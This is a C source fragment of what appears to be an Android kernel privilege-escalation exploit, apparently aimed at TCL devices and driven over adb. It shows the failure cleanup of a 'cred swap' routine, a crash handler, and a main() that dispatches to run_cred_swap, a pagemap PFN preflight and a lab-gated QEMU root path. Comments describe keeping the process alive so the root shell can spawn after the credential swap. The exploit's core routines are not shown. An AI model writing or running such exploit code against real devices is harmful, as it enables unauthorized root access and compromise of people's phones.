  /* The original-shell relay is forked before the reclaim.  A fail-closed
   * capture refusal returns before the success path publishes relay output;
   * without an explicit stop the child stays in its command loop, becomes an
   * init-owned orphan and keeps the adb stdout pipe open.  This is userspace
   * cleanup only: signal the shared exit flag, reap the child, then release
   * the private shared mapping. */
  if (relay != MAP_FAILED) {
    __atomic_thread_fence(__ATOMIC_SEQ_CST);
    relay->ready = 99;
    __atomic_thread_fence(__ATOMIC_SEQ_CST);
    if (relay_child_pid > 0) {
      int relay_status = 0;
      while (waitpid(relay_child_pid, &relay_status, 0) < 0 &&
             errno == EINTR) {}
      pr_info("TCL relay: fail-path child reaped status=%d\n", relay_status);
    }
    munmap(relay, sizeof(*relay));
  }
  pr_error("cred swap failed after %d attempts\n", attempts);
  return 1;
}

#include <signal.h>
static void ghost_segv_handler(int sig, siginfo_t *si, void *uc) {
  char b[160];
  int n = snprintf(b, sizeof(b),
      "[FATAL] signal %d at addr %p (main thread died post-cred-swap?)\n",
      sig, si->si_addr);
  write(1, b, n);
  _exit(139);
}

int main(int argc, char **argv) {
    if (argc > 1 && strcmp(argv[1], "--profile-info") == 0)
        return print_profile_info(argc > 2 ? argv[2] : NULL);
    if (argc > 1 && strcmp(argv[1], "--capture-witness-preflight") == 0) {
        uint64_t pfn = 0;
        int visible = tcl_pagemap_pfn_preflight(&pfn);
        printf("CAPTURE_WITNESS_PREFLIGHT PFN_VISIBLE=%d PFN=%llx "
               "SAFE_READ_ONLY=1\n", visible, (unsigned long long)pfn);
        return 0;
    }
    struct sigaction sa = { .sa_sigaction = ghost_segv_handler,
                            .sa_flags = SA_SIGINFO };
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    /* A broken/EOF stdout (adb hiccup, terminal close) must not SIGPIPE-kill
     * the exploit mid-run: the cred swap + exec path prints to stdout right
     * before execl(), and a SIGPIPE there silently kills the whole process
     * before the root shell can spawn. Ignored dispositions survive exec. */
    signal(SIGPIPE, SIG_IGN);
    if (argc > 1 && strcmp(argv[1], "--selftest") == 0)
        return run_selftest();
#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
    if (argc > 1 && strcmp(argv[1], "--qemu-two-cycle-root") == 0)
        return run_qemu_two_cycle_root();
#endif
    if (argc > 1 && strcmp(argv[1], "--cred") == 0)
        return run_cred_swap();
    fprintf(stderr,
            "No action selected. Use --profile-info for read-only profile "
            "inspection.\n");
    return 2;
}
